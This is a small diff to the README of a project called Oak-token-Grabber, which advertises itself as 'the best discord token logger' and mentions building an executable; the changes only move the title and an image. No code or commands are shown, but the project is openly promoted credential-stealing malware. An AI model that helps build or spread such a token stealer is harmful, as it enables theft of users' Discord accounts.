@@ -1,6 +1,4 @@
-# Oak-token-Grabber
-  ![fr](https://i.imgur.com/dEiUxyB.png)
-## Oak Grabber:
+# Oak-token-Grabber:
 The best discord token logger!  
 
 **Features:**  
@@ -24,4 +22,5 @@ The best discord token logger!
  step 4: `run build-exe.bat`  
  
  
- 
+ # Oak-Grabber
+  ![fr](https://i.imgur.com/dEiUxyB.png)
